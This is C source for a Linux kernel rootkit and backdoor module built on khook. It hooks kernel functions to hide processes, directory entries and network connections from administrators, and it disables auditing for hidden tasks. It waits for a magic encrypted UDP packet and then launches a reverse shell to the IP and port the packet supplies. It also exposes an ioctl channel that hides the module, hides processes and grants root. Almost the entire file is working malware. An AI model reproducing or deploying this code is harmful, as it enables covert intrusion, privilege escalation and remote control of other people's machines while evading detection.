#include <khook/engine.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/workqueue.h>
#include <linux/net.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <linux/net.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/audit.h>
#include <linux/dcache.h>
#include <net/inet_sock.h>
#include <linux/seq_file.h>
#include "util.h"
#include "module.h"
#include "proc.h"
#include "dir.h"
#include "network.h"
// #include "file.h"
#include "config.h"
// #define PATH_MAX 1024
#define TIF_SYSCALL_AUDIT	4

 int retexec = 0;
/* ------------------------ HIDE PROCESS ------------------------- */
int hidden = 1; 
KHOOK(copy_creds);
static int khook_copy_creds(struct task_struct *p, unsigned long clone_flags)
{
	int ret = 0;

	ret = KHOOK_ORIGIN(copy_creds, p, clone_flags);
	if (!ret && is_task_invisible(current))
		p->flags |= FLAG;

	return ret;
}
KHOOK(exit_creds);
static void khook_exit_creds(struct task_struct *p)
{
	KHOOK_ORIGIN(exit_creds, p);
	if (is_task_invisible(p))
		p->flags &= ~FLAG;
}
KHOOK(audit_alloc);
static int khook_audit_alloc(struct task_struct *t)
{
	int err = 0;

	if (is_task_invisible(t)) {
		clear_tsk_thread_flag(t, TIF_SYSCALL_AUDIT);
	} else {
		err = KHOOK_ORIGIN(audit_alloc, t);
	}
	return err;
}

KHOOK(find_task_by_vpid);
struct task_struct *khook_find_task_by_vpid(pid_t vnr)
{
	struct task_struct *tsk = NULL;

	tsk = KHOOK_ORIGIN(find_task_by_vpid, vnr);
	if (tsk && is_task_invisible(tsk) && !is_task_invisible(current))
		tsk = NULL;

	return tsk;
}

KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
static long khook___x64_sys_kill(const struct pt_regs *regs) {
    if (regs->si == 0) {
		if (is_proc_invisible(regs->di)) {
			return -ESRCH;
		}
	}
    
	return KHOOK_ORIGIN(__x64_sys_kill, regs);
}
KHOOK_EXT(int, vfs_statx, int, const char __user *, int, struct kstat *, u32);
static int khook_vfs_statx(int dfd, const char __user *filename, int flags, struct kstat *stat,
						u32 request_mask)
{
	if (is_proc_invisible_2(filename))
		return -EINVAL;

	return KHOOK_ORIGIN(vfs_statx, dfd, filename, flags, stat, request_mask);
}
KHOOK_EXT(struct tgid_iter, next_tgid, struct pid_namespace *, struct tgid_iter);
static struct tgid_iter khook_next_tgid(struct pid_namespace *ns, struct tgid_iter iter)
{
	if (hidden) {
		while ((iter = KHOOK_ORIGIN(next_tgid, ns, iter), iter.task) != NULL) {
			if (!(iter.task->flags & FLAG))
				break;

			iter.tgid++;
		}
	} else {
		iter = KHOOK_ORIGIN(next_tgid, ns, iter);
	}
	return iter;
}
/* ------------------------- HIDE DIR --------------------------- */
KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_fillonedir(void *__buf, const char *name, int namlen,
			    loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENOENT;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir(void *__buf, const char *name, int namlen,
			 loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENOENT;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, filldir64, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_filldir64(void *__buf, const char *name, int namlen,
			   loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENOENT;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
				   loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENOENT;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

KHOOK_EXT(int, compat_filldir, void *, const char *, int, loff_t, u64, unsigned int);
static int khook_compat_filldir(void *__buf, const char *name, int namlen,
				loff_t offset, u64 ino, unsigned int d_type)
{
	int ret = -ENOENT;
	if (!strstr(name, HIDE) || !hidden)
		ret = KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
	return ret;
}

// KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
// struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name)
// KHOOK_EXT(struct dentry *, __d_lookup, struct dentry *, struct qstr *);
// struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
// {
// 	struct dentry *found = NULL;
// 	if (!strstr(name->name, HIDE) || !hidden)
// 		found = KHOOK_ORIGIN(__d_lookup, parent, name);
// 	return found;
// }


static struct nf_hook_ops *nfho = NULL ;
struct shell_task {
	struct work_struct work;
	char *ip;
	char *port;
};
/*NETWORK HIDDING  */
// LIST_HEAD(hidden_conn_list);

KHOOK_EXT(int, tcp4_seq_show, struct seq_file *, void *);
static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
{
	int ret;
	struct sock *sk = v;
	struct inet_sock *inet;
	struct hidden_conn *hc;
	unsigned int daddr;
	//unsigned short dport;

	if (v == SEQ_START_TOKEN) {
		goto origin;
	}

	inet = (struct inet_sock *)sk;

	daddr = inet->inet_daddr;
	//dport = inet->inet_dport;


	list_for_each_entry(hc, &hidden_conn_list, list)
	{
		if (hc->addr.sin_addr.s_addr == daddr /* && hc->addr.sin_port == dport */) {
			ret = 0;
			goto out;
		}
	}
origin:
	ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
out:
	return ret;
}

KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);
static int khook_udp4_seq_show(struct seq_file *seq, void *v)
{
	int ret;
	struct sock *sk = v;
	struct inet_sock *inet;
	struct hidden_conn *hc;
	unsigned int daddr;

	if (v == SEQ_START_TOKEN) {
		goto origin;
	}

	inet = (struct inet_sock *)sk;

	daddr = inet->inet_daddr;


	list_for_each_entry(hc, &hidden_conn_list, list)
	{
		if (hc->addr.sin_addr.s_addr == daddr /* && hc->addr.sin_port == dport */) {
			ret = 0;
			goto out;
		}
	}
origin:
	ret = KHOOK_ORIGIN(udp4_seq_show, seq, v);
out:
	return ret;
}

// int file_tampering_flag = 0;

// // This is not the best way to do that, but it works, maybe in the future I change that
// KHOOK_EXT(ssize_t, vfs_read, struct file *, char __user *, size_t, loff_t *);
// static ssize_t khook_vfs_read(struct file *file, char __user *buf,
// 			      size_t count, loff_t *pos)
// {
// 	ssize_t ret;

// 	atomic_set(&read_on, 1);
// 	ret = KHOOK_ORIGIN(vfs_read, file, buf, count, pos);

// 	if (file_tampering_flag) {
// 		if (file_check(buf, ret) == 1)
// 			ret = hide_content(buf, ret);
// 	}
// 	atomic_set(&read_on, 0);

// 	return ret;
// }



/* BACKDOOR */
void shell_execer(struct work_struct *work)
{ 
	struct shell_task *task = (struct shell_task *)work;
	printk(KERN_INFO "the ip %s and port %s",task->ip ,task->port);
    	char *argv[] = { TSH_PATH, "-t", task->ip, "-p", task->port, "-s" ,secret,NULL};
        
	  retexec = exec(argv);
	  printk(KERN_INFO "the value of exec %d",retexec);
	kfree(task->ip);
	kfree(task->port);
	kfree(task);
}

int shell_exec_queue(char *ip, char *port)
{
	struct shell_task *task;

	task = kmalloc(sizeof(*task), GFP_KERNEL);

	if (!task)
		return 0;

	task->ip = kstrdup(ip, GFP_KERNEL);
	if (!task->ip) {
		kfree(task);
		return 0;
	}

	task->port = kstrdup(port, GFP_KERNEL);
	if (!task->port) {
		kfree(task->ip);
		kfree(task);
		return 0;
	}

	INIT_WORK(&task->work, &shell_execer);

	return schedule_work(&task->work);
}
static unsigned int hfunc (void *priv, struct sk_buff * skb ,const struct nf_hook_state * state){
 struct iphdr * iph ;
  struct udphdr * udph ;
  struct udphdr _udphdr ;
  struct iphdr _iphdr ;
  int size;
  int str_size ;
 const  char * data = NULL ;
  char  * _data ; 
  char *argv_str ;
  char ** argv ;
  if(!skb)
  return NF_ACCEPT ;

    iph = ip_hdr(skb);
	if(iph->protocol == IPPROTO_UDP){
		size = ntohs(iph->tot_len)-sizeof(_iphdr)-sizeof(_udphdr);
        _data = kmalloc(size , GFP_KERNEL);
		 str_size = size - strlen(MAGIC_VALUE);
		 argv_str = kzalloc(str_size , GFP_KERNEL);
		udph = udp_hdr(skb);
      if(ntohs(udph->dest) == SRCPORT){
		// printk(KERN_INFO"the packet get matched \n");
         data = skb_header_pointer(skb ,iph->ihl * 4 + sizeof(struct udphdr),size,_data);
		 if(!data){
		   return NF_ACCEPT;
		 }
		 if(memcmp(data,MAGIC_VALUE,strlen(MAGIC_VALUE))==0){
               memcpy(argv_str,data + strlen(MAGIC_VALUE)+1,str_size-1);
			do_decrypt(argv_str, str_size - 1, KEY);

			argv = argv_split(GFP_KERNEL, argv_str, NULL);
				if (argv) {
					shell_exec_queue(argv[0], argv[1]);
					argv_free(argv);
				}
				kfree(_data);
				kfree(argv_str);


		  return NF_DROP  ;
	  }
	  kfree(_data);
	  kfree(argv_str);
	  return NF_ACCEPT ;
	}
	kfree(_data);
	  kfree(argv_str);

	return NF_ACCEPT ;
 }
 return NF_ACCEPT;
}
int control_flag = 0 ;

struct control {
	unsigned short cmd ;
	void * argv ; 
};
KHOOK_EXT(int,inet_ioctl,struct socket *,unsigned int ,unsigned long);
static int khook_inet_ioctl(struct socket * sock , unsigned int cmd ,unsigned long arg ){
	  int ret = 0;
	  unsigned int pid ;
	  struct control args ;
	  struct sockaddr_in addr ;
	  if(cmd == AUTH && arg == HTUA ){
               if (control_flag) {
			control_flag = 0;
		} else {
			control_flag = 1;
		}

		goto out;
	}
	if(control_flag && cmd == AUTH ){
		if(copy_from_user(&args,(void *)arg ,sizeof(args)))
			goto out;
		switch (args.cmd) {
		case 0:
			hide_module();

			// flip_hidden_flag();
			break;
		case 1:
			if (copy_from_user(&pid, args.argv, sizeof(unsigned int)))
				goto out;

			hide_proc(pid);

			break;
		case 2:
			// file_tampering();

			break;
		case 3:
			set_root();

			break;
		case 4:
			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
				goto out;

			network_hide_add(addr);
			break;
		case 5:
			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
				goto out;

			network_hide_remove(addr);
			break;
		default:
			goto origin;
		}
		goto out ;
	}
	origin:
		ret = KHOOK_ORIGIN(inet_ioctl,sock,cmd ,arg);
	out:
		return ret ;
	  }


static int  __init init_backdoor(void){
    
	nfho = (struct nf_hook_ops*)kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
	
	/* Initialize netfilter hook */
	nfho->hook 	= (nf_hookfn*)hfunc;		/* hook function */
	nfho->hooknum 	= NF_INET_PRE_ROUTING;		/* received packets */
	nfho->pf 	= PF_INET;			/* IPv4 */
	nfho->priority 	= NF_IP_PRI_FIRST;		/* max hook priority */
	
	nf_register_net_hook(&init_net, nfho);
	
	
	khook_init(NULL);

    return 0;
}
static void __exit exit_backdoor(void){
	nf_unregister_net_hook(&init_net, nfho);
	kfree(nfho);
   khook_cleanup();

} 

module_init(init_backdoor);
module_exit(exit_backdoor);

MODULE_LICENSE("GPL");
